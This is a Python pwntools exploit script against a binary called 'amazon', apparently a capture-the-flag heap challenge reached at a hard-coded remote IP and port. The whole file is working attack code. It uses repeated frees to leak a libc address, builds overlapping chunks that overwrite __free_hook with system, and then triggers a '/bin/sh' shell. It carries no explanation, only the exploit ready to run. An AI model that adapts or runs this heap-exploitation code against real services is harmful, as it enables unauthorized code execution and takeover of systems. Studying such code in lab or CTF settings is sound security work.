#coding=utf-8
from pwn import *
local = 0
exec_file="./amazon"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6") 
else:
    a=remote("121.41.38.38",9999)
    libc=ELF("./libc-2.27.so")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x000000000001513)
    b *($text_base+0x0000000000001300)
    b *($text_base+0x0000000000015BA)
    b *($text_base+0x000000000001252)
    '''
    gdb.attach(a,script)

def menu(idx):
    a.sendlineafter("Your choice: ",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("What item do you want to buy: ","0")
    a.sendlineafter("How many: ",str(1))
    a.sendlineafter("How long is your note: ",str(size))
    a.sendafter("Content: ",content)

def delete(idx):
    menu(3)
    a.sendlineafter("Which item are you going to pay for: ",str(idx))

def show():
    menu(2)

add(0x88,'A')#0
add(0x68,'A')#1
add(0x58,'A')#2
add(0x18,'A')#3

for i in range(8):
    delete(0)
show()
a.recvuntil("Name: ")
libc_base=u64(a.recv(6)+'\x00\x00')-libc.symbols["__malloc_hook"]-0x10-96
success("libc_base ==> 0x%x"%libc_base)
#debug()
for i in range(8):
    delete(1)
for i in range(8):
    delete(2)
#debug()
add(0xe0,'A'*0x98+p64(0xa1)+p64(libc_base+libc.symbols["__free_hook"]-0x40))#4
#debug()
add(0x48,'A'*(0x40-16)+"/bin/sh\x00")#5
#debug()
add(0x68,'A')

add(0x68,'\x00'*0x20+p64(libc_base+libc.symbols["system"]))
#debug()
delete(2)

a.interactive()







